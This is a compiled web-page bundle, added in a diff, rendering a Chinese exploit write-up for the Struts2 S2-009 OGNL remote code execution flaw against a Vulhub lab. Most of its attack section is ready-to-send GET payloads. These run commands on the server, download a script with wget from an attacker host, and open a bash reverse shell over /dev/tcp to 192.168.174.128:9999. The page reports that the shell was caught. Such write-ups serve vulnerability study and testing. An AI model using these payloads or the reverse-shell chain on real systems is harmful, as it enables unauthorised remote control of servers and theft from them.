@@ -1,0 +1,42 @@
+import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as d,c,a as e,b as a,d as t,e as s}from"./app-58e4a7d6.js";const r={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),u={href:"https://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md",target:"_blank",rel:"noopener noreferrer"},m={href:"https://www.t00ls.net/viewthread.php?tid=21197",target:"_blank",rel:"noopener noreferrer"},p=s("<p>Struts2对s2-003的修复方法是禁止静态方法调用，在s2-005中可直接通过OGNL绕过该限制，对于<code>#</code>号，同样使用编码<code>\\u0023</code>或<code>\\43</code>进行绕过；于是Struts2对s2-005的修复方法是禁止<code>\\</code>等特殊符号，使用户不能提交反斜线。</p><p>但是，如果当前action中接受了某个参数<code>example</code>，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在<code>example</code>参数中，然后使用<code>/helloword.acton?example=&lt;OGNL statement&gt;&amp;(example)(&#39;xxx&#39;)=1</code>的方法来执行它，从而绕过官方对<code>#</code>、<code>\\</code>等特殊字符的防御。</p><p>漏洞详情:</p>",3),v={href:"http://struts.apache.org/docs/s2-009.html",target:"_blank",rel:"noopener noreferrer"},h=s(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>影响版本: 2.1.0 - 2.3.1.1</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行以下命令启动s2-009测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
+docker-compose up -d
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>测试环境是一个struts2的“功能展示”网站<code>Struts Showcase</code>，代码很多，我们的目标是去找一个接受了参数，参数类型是string的action。</p><p>先对<code>S2-009.war</code>进行解压（我用binwalk，其实直接zip就可以），可见源码都在<code>WEB-INF/src</code>目录中，我一般找ajax相关的代码，这些代码一般逻辑比较简单。</p><p>找到一个<code>WEB-INF/src/java/org/apache/struts2/showcase/ajax/Example5Action.java</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>public class Example5Action extends ActionSupport {
+
+    private static final long serialVersionUID = 2111967621952300611L;
+
+    private String name;
+    private Integer age;
+
+
+    public String getName() { return name; }
+    public void setName(String name) { this.name = name; }
+
+    public Integer getAge() { return age; }
+    public void setAge(Integer age) { this.age = age; }
+
+    @Override
+    public String execute() throws Exception {
+        return SUCCESS;
+    }
+}
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>代码没有更简单了，其接受了name参数并调用setName将其赋值给私有属性<code>this.name</code>，正是符合我们的要求。然后去<code>WEB-INF/src/java/struts-ajax.xml</code>看一下URL路由：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;package name=&quot;ajax&quot; extends=&quot;struts-default&quot;&gt;
+    ...
+    &lt;action name=&quot;example5&quot; class=&quot;org.apache.struts2.showcase.ajax.Example5Action&quot;&gt;
+        &lt;result name=&quot;input&quot;&gt;/ajax/tabbedpanel/example5.jsp&lt;/result&gt;
+        &lt;result&gt;/ajax/tabbedpanel/example5Ok.jsp&lt;/result&gt;
+    &lt;/action&gt;
+    ...
+&lt;/package&gt;
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>name=example5</code>，所以访问<code>http://your-ip:8080/ajax/example5.action</code>即可访问该控制器。按照原理中说到的方法，将OGNL利用代码放在name参数里，访问该URL：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /ajax/example5?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/awesome_poc%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true HTTP/1.1
+Host: localhost:8080
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011656411.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>由于该POC没有回显，所以调用的是<code>touch /tmp/awesome_poc</code>命令，查看/tmp目录发现已经成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011656842.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>编写shell脚本并启动http服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot; &gt; shell.sh
+python3环境下：python -m http.server 80
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>上传shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wget 192.168.174.128/shell.sh
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>上传shell.sh文件的Payload为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /ajax/example5?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27wget%20192.168.174.128/shell.sh%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true HTTP/1.1
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash /usr/local/tomcat/shell.sh
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行shell.sh文件的Payload为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /ajax/example5?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27bash%20/usr/local/tomcat/shell.sh%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true HTTP/1.1
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011659531.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,30);function g(b,x){const n=l("ExternalLinkIcon");return d(),c("div",null,[o,e("blockquote",null,[e("p",null,[a("前置阅读： 这个漏洞再次来源于s2-003、s2-005。了解该漏洞原理，需要先阅读s2-005的说明："),e("a",u,[a("https://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md"),t(n)])])]),e("p",null,[a("参考"),e("a",m,[a("Struts2漏洞分析之Ognl表达式特性引发的新思路"),t(n)]),a("，文中说到，该引入ognl的方法不光可能出现在这个漏洞中，也可能出现在其他java应用中。")]),p,e("ul",null,[e("li",null,[e("a",v,[a("http://struts.apache.org/docs/s2-009.html"),t(n)])])]),h])}const w=i(r,[["render",g],["__file","Struts2 S2-009 远程代码执行漏洞.html.vue"]]);export{w as default};
